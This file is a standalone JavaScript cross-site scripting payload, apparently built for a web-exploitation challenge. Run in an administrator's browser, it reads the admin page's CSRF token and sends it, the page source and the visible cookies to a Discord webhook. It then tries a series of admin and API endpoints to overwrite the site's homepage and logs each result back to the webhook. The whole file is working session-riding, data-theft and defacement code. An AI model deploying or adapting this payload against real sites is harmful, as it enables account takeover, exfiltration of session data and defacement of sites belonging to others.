(async () => {
  const T = "VTG914";
  const DWH = "https://discord.com/api/webhooks/1538666990133055549/AfgcOB48h9IiSn7KW-nIMkFru_uzAIyUTHy6g4P8-YsyP7lJobGhycKzScqSTYbuA-c8";
  const SEIZED_B64 = "";
  const SEIZED = decodeURIComponent(escape(atob(SEIZED_B64)));

  const bc = async (k) => { try { await fetch('/account.php/'+T+'_'+k+'.css', {credentials:'include',cache:'no-store'}); } catch(e){} };
  const g = (u,o) => fetch(u, Object.assign({credentials:'include',cache:'no-store'},o||{}));
  const dw = async (msg) => { try { await fetch(DWH, {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({content: msg.slice(0,1900)})}); } catch(e){} };
  const checkHome = async () => { try { const t = await (await g('/?_='+Date.now())).text(); return !t.includes('THE VANTAGE'); } catch(e){ return false; } };

  await bc('A');

  // Helper: try POST with FormData and verify homepage
  const tryPost = async (ep, params, label) => {
    try {
      const fd = new FormData();
      for (const [k,v] of Object.entries(params)) fd.append(k,v);
      const r = await g(ep, {method:'POST', body: fd});
      const txt = await r.text();
      const won = await checkHome();
      const msg = label + ' | status='+r.status+' won='+won+' resp='+txt.slice(0,200);
      await dw('[VTG914] ' + msg);
      await bc(label.replace(/[^A-Za-z0-9]/g,'_').slice(0,30));
      return won;
    } catch(e){ await dw('[VTG914] ERR ' + label + ': ' + e); return false; }
  };

  // Helper: try JSON POST
  const tryJSON = async (ep, body, label) => {
    try {
      const r = await g(ep, {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(body)});
      const txt = await r.text();
      const won = await checkHome();
      await dw('[VTG914] JSON ' + label + ' status='+r.status+' won='+won+' resp='+txt.slice(0,200));
      return won;
    } catch(e){ await dw('[VTG914] ERR JSON '+label+': '+e); return false; }
  };

  // Read admin session CSRF token if any
  let csrf = '';
  try {
    const adminHtml = await (await g('/admin/')).text();
    const csrfM = adminHtml.match(/name="csrf[_-]?token"[^>]*value="([^"]+)"/i) ||
                  adminHtml.match(/name="_token"[^>]*value="([^"]+)"/i) ||
                  adminHtml.match(/csrf[_-]?token["\s]*:["\s]*"([^"]+)"/i);
    if (csrfM) { csrf = csrfM[1]; }
    await dw('[VTG914] admin/ csrf=' + csrf + ' | source snippet: ' + adminHtml.slice(0,500));
  } catch(e){}

  // Attempt page writes using admin session credentials
  const won1 = await tryPost('/admin/', {slug:'home', body:SEIZED, csrf_token:csrf}, 'POST_admin_home_body');
  if (won1) { await bc('WON'); return; }

  const won2 = await tryPost('/admin/', {slug:'home', content:SEIZED, csrf_token:csrf}, 'POST_admin_home_content');
  if (won2) { await bc('WON'); return; }

  const won3 = await tryPost('/admin/', {page:'home', html:SEIZED, csrf_token:csrf}, 'POST_admin_page_html');
  if (won3) { await bc('WON'); return; }

  const won4 = await tryPost('/admin/', {id:'1', body:SEIZED, save:'1', csrf_token:csrf}, 'POST_admin_id1_save');
  if (won4) { await bc('WON'); return; }

  // Try review.php with a special seize action
  const won5 = await tryPost('/admin/review.php', {action:'seize', slug:'home', body:SEIZED}, 'POST_review_seize');
  if (won5) { await bc('WON'); return; }

  // Try /seize.php endpoint directly
  const r_seize = await g('/seize.php');
  await dw('[VTG914] GET /seize.php = ' + r_seize.status + ' ' + (await r_seize.text()).slice(0,200));

  // Try PUT to /api/pages with session cookie (not api_key)
  const won6 = await tryJSON('/api/pages', {slug:'home', body:SEIZED}, 'PUT_api_pages_session');

  // Check what X-Request cookies we have
  const cookieInfo = document.cookie;
  await dw('[VTG914] Visible cookies: ' + cookieInfo);

  // Try updating settings via POST
  const won7 = await tryPost('/admin/', {key:'homepage_override', value:SEIZED}, 'POST_admin_setting');

  await bc('DONE');
  await dw('[VTG914] DONE - all attempts tried');
})();
